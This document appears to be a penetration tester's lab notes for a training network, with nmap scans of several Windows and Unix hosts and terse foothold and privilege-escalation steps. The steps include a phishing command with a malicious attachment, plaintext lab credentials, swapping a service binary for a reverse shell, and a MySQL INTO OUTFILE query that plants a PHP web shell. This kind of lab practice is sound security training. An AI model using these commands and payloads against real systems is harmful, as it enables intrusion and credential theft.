# VM 1 .6
- DC02
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-18 05:15:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-18T05:17:36+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC02.relia.com
| Not valid before: 2024-05-15T11:49:02
|_Not valid after:  2024-11-14T11:49:02
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: DC02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: DC02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-18T05:16:54+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
58296/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58301/tcp open  msrpc         Microsoft Windows RPC
58316/tcp open  msrpc         Microsoft Windows RPC
58333/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:86:92 (VMware)
| smb2-time: 
|   date: 2024-08-18T05:16:53
|_  start_date: N/A


```

# VM 4 .14 (pwned)
- WK01
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-18T05:37:59+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK01
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK01.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2024-08-18T05:36:13+00:00
| ssl-cert: Subject: commonName=WK01.relia.com
| Not valid before: 2024-05-15T11:50:29
|_Not valid after:  2024-11-14T11:50:29
5040/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  tcpwrapped
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-18T05:36:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

## foothold
```
sending phishing email to .189

sudo swaks -t jim@relia.com --from maildmz@relia.com --auth-password DPuBT9tGCBrTbR --attach @config.Library-ms --server 192.168.192.189 --body body.txt --header "Subject: Problems" --suppress-data
```
## Root
```
Not required...
proof.txt is put under users/offsec folder -,-
```
## Interesting info
```
 dmzadmin:SlimGodhoodMope
```

# VM 5 .30
- WEBBY
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Anna Test Machine
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEBBY.relia.com
| Not valid before: 2024-05-15T11:50:23
|_Not valid after:  2024-11-14T11:50:23
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WEBBY
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WEBBY.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-18T05:36:12+00:00
|_ssl-date: 2024-08-18T05:37:59+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
27017/tcp open  mongodb       MongoDB 6.0.2
| mongodb-databases: 
|   errmsg = Unsupported OP_QUERY command: listDatabases. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|   ok = 0.0
|   codeName = UnsupportedOpQueryCommand
|_  code = 352
| mongodb-info: 
|   MongoDB Build info
|     gitVersion = 94fb7dfc8b974f1f5343e7ea394d0d9deedba50e
|     targetMinOS = Windows 7/Windows Server 2008 R2
|     sysInfo = deprecated
|     modules
|     ok = 1.0
|     storageEngines
|       1 = ephemeralForTest
|       2 = wiredTiger
|       0 = devnull
|     javascriptEngine = mozjs
|     openssl
|       running = Windows SChannel
|     debug = false
|     allocator = tcmalloc
|     buildEnvironment
|       ccflags = /nologo /WX /FImongo/platform/basic.h /fp:strict /EHsc /W3 /wd4068 /wd4244 /wd4267 /wd4290 /wd4351 /wd4355 /wd4373 /wd4800 /wd4251 /wd4291 /we4013 /we4099 /we4930 /errorReport:none /MD /O2 /Oy- /bigobj /utf-8 /permissive- /Zc:__cplusplus /Zc:sizedDealloc /volatile:iso /diagnostics:caret /std:c++17 /Gw /Gy /Zc:inline
|       linkflags = /nologo /DEBUG /INCREMENTAL:NO /LARGEADDRESSAWARE /OPT:REF
|       cc = cl: Microsoft (R) C/C++ Optimizing Compiler Version 19.31.31107 for x64
|       cxxflags = /TP
|       distarch = x86_64
|       target_arch = x86_64
|       cppdefines = SAFEINT_USE_INTRINSICS 0 PCRE_STATIC NDEBUG BOOST_ALL_NO_LIB _UNICODE UNICODE _SILENCE_CXX17_ALLOCATOR_VOID_DEPRECATION_WARNING _SILENCE_CXX17_OLD_ALLOCATOR_MEMBERS_DEPRECATION_WARNING _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING _SILENCE_ALL_CXX20_DEPRECATION_WARNINGS _CONSOLE _CRT_SECURE_NO_WARNINGS _ENABLE_EXTENDED_ALIGNED_STORAGE _SCL_SECURE_NO_WARNINGS _WIN32_WINNT 0x0A00 BOOST_USE_WINAPI_VERSION 0x0A00 NTDDI_VERSION 0x0A000000 BOOST_THREAD_VERSION 5 BOOST_THREAD_USES_DATETIME BOOST_SYSTEM_NO_DEPRECATED BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR ABSL_FORCE_ALIGNED_ACCESS
|       target_os = windows
|       distmod = windows
|       cxx = cl: Microsoft (R) C/C++ Optimizing Compiler Version 19.31.31107 for x64
|     bits = 64
|     version = 6.0.2
|     maxBsonObjectSize = 16777216
|     versionArray
|       1 = 0
|       2 = 2
|       3 = 0
|       0 = 6
|   Server status
|     errmsg = Unsupported OP_QUERY command: serverStatus. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|     ok = 0.0
|     codeName = UnsupportedOpQueryCommand
|_    code = 352
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     Unsupported OP_QUERY command: serverStatus. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|     code
|     codeName
|_    UnsupportedOpQueryCommand
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WEBBY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:a6:c1 (VMware)
| smb2-time: 
|   date: 2024-08-18T05:36:13
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

# VM 6 .15 (pwned)
- WK02
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-18T05:37:59+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WK02.relia.com
| Not valid before: 2024-05-15T11:50:23
|_Not valid after:  2024-11-14T11:50:23
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2024-08-18T05:36:13+00:00
5040/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2024-08-18T05:36:04
|_  start_date: N/A
|_nbstat: NetBIOS name: WK02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:1b:c5 (VMware)
```

## Foothold
```
xfreerdp /v:172.16.197.15 /u:andrea /p:'PasswordPassword_6' /d:relia.com /cert-ignore
```

## Root
```
    replacing rev shell exe to c:/updatecollector/updatecollctor.exe 
```

# VM 7 .19 (pwned) 
- backup
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 61:d7:77:83:c6:48:69:ca:42:35:0e:62:c3:30:b7:b4 (RSA)
|   256 c7:62:4a:de:a5:b4:f1:2a:5a:f3:a1:d8:d3:96:1b:8d (ECDSA)
|_  256 f2:94:b5:71:88:a1:f8:c5:d9:47:77:6b:07:ae:27:a0 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Foothold
```
    ssh sarah@172.16.140.19 -i backup-machine-ssh-sarah
```

## Root
```
    su amy
    backup1
```

## Interesting cracking
```
sudo borg list /opt/borgbackup
xinyVzoH2AnJpRK9sfMgBA [get from monitoring process | ]
sudo borg extract /opt/borgbackup::home --stdout [if not works sometime can directly output]
```

## Interesting Info
```
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}
```

# VM 8 .20
- production
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 33:4a:77:87:5b:88:f4:f1:f3:bb:75:7b:ec:9e:21:31 (RSA)
|   256 c8:3a:f1:c9:e1:9c:31:2d:9d:26:df:c7:c5:21:d8:e3 (ECDSA)
|_  256 f6:79:92:a4:06:56:38:e3:ca:15:91:a8:dc:94:44:2c (ED25519)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=8/18%Time=66C18814%P=x86_64-pc-linux-gnu%
SF:r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTT
SF:POptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSV
SF:ersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTC
SF:P,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\
SF:x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCoo
SF:kie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNe
SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05
SF:HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStri
SF:ng,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x
SF:01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x2
SF:0message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Note
SF:sRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1
SF:a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,3
SF:2,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inva
SF:lid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

## Foothold
```
    ssh andrew@172.16.186.20 
    Rb9kNokjDsjYyH
```

## Root
abusing doas (freebsd)
```
1.  doas service apache24 onestart

```
# VM 9 .21
- FILES
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: FILES, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:1e:07 (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-18T05:16:54
|_  start_date: N/A
|_clock-skew: -1s
```

# VM 15 .7 (pwned)
- INTRANET
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was http://172.16.197.7/wordpress/
|_http-generator: WordPress 6.0.3
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-generator: WordPress 6.0.3
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was https://172.16.197.7/wordpress/
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=INTRANET.relia.com
| Not valid before: 2024-05-15T11:50:10
|_Not valid after:  2024-11-14T11:50:10
|_ssl-date: 2024-08-18T05:17:36+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: INTRANET
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: INTRANET.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-18T05:16:54+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-18T05:16:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: INTRANET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:88:e9 (VMware)
```

## Foothold
```
rdesktop -u michelle -p 'NotMyPassword0k?' -d relia.com 172.16.197.7
```

## Root
```
1. Use ligolo get foothold on this host
2. mysql -u root -h 240.0.0.1 -P 3306
3. use wordpress
4. run SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\xampp\htdocs\wordpress\backdoor.php"
5. http://intranet.relia.com/wordpress/backdoor.php?cmd=whoami  <- change rev shell
```

## Interesting info

```
    File: C:\xampp\htdocs\wordpress\wp-config.php
    // ** Database settings - You can get this info from your web host ** //

    /** The name of the database for WordPress */

    define( 'DB_NAME', 'wordpress' );

    /** Database username */

    define( 'DB_USER', 'root' );

    /** Database password */

    define( 'DB_PASSWORD', '' );

    /** Database hostname */

    define( 'DB_HOST', 'localhost' );
```